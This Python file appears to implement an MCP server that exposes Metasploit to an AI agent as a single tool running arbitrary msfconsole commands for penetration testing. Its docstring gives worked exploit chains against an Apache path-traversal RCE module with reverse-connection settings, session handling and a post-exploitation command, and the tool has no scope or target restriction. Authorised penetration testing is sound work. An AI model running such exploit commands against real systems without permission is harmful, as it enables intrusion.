"""
Metasploit MCP Server - Exploitation Framework

Exposes Metasploit Framework as a single MCP tool for agentic penetration testing.
Provides a console-like interface where the agent sends msfconsole commands directly.

Tools:
    - metasploit_console: Execute any msfconsole command
"""

from fastmcp import FastMCP
import subprocess
import os

# Server configuration
SERVER_NAME = "metasploit"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("METASPLOIT_PORT", "8003"))

mcp = FastMCP(SERVER_NAME)


def _run_msfconsole(commands: str, timeout: int = 120) -> str:
    """Helper to run msfconsole commands."""
    try:
        # Build command - use -x for executing commands
        cmd = ["msfconsole", "-q", "-x", f"{commands}; exit"]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output.strip() if output else "(no output)"
    except subprocess.TimeoutExpired:
        return f"[ERROR] Command timed out after {timeout} seconds"
    except FileNotFoundError:
        return "[ERROR] msfconsole not found. Ensure Metasploit is installed."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def metasploit_console(command: str) -> str:
    """
    Execute Metasploit Framework console commands.

    IMPORTANT: This tool is STATELESS - each call starts a fresh msfconsole session.
    You MUST include ALL commands in a single call using semicolons to chain them.

    WRONG (will fail - no module context):
        Call 1: "use exploit/multi/http/apache_normalize_path_rce"
        Call 2: "set RHOSTS 10.0.0.5"
        Call 3: "exploit"  <-- FAILS: no module loaded!

    CORRECT (all in one call):
        "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.0.0.5; set RPORT 443; set SSL true; exploit"

    Args:
        command: One or more msfconsole commands separated by semicolons.
                 Chain ALL related commands together in a single call.

    Returns:
        The output from msfconsole

    Examples:
        Search for exploits:
        - "search CVE-2021-41773"
        - "search type:exploit apache"

        Get module info:
        - "info exploit/multi/http/apache_normalize_path_rce"

        Configure and run exploit (ALL IN ONE CALL):
        - "use exploit/multi/http/apache_normalize_path_rce; show options"
        - "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.0.0.5; set RPORT 443; set SSL true; set LHOST 10.0.0.10; set LPORT 4444; check"
        - "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.0.0.5; set RPORT 443; set SSL true; set LHOST 10.0.0.10; set LPORT 4444; exploit"

        Session management:
        - "sessions -l"
        - "sessions -i 1"

        Post-exploitation:
        - "sessions -c 'whoami' -i 1"
    """
    # Determine timeout based on command type
    timeout = 120  # Default timeout

    # Longer timeout for exploit commands
    if any(cmd in command.lower() for cmd in ['exploit', 'run', 'sessions -i']):
        timeout = 180

    # Shorter timeout for info/search commands
    if any(cmd in command.lower() for cmd in ['search', 'info', 'show']):
        timeout = 60

    return _run_msfconsole(command, timeout=timeout)


if __name__ == "__main__":
    # Check transport mode from environment
    transport = os.getenv("MCP_TRANSPORT", "stdio")

    if transport == "sse":
        mcp.run(transport="sse", host=SERVER_HOST, port=SERVER_PORT)
    else:
        mcp.run(transport="stdio")
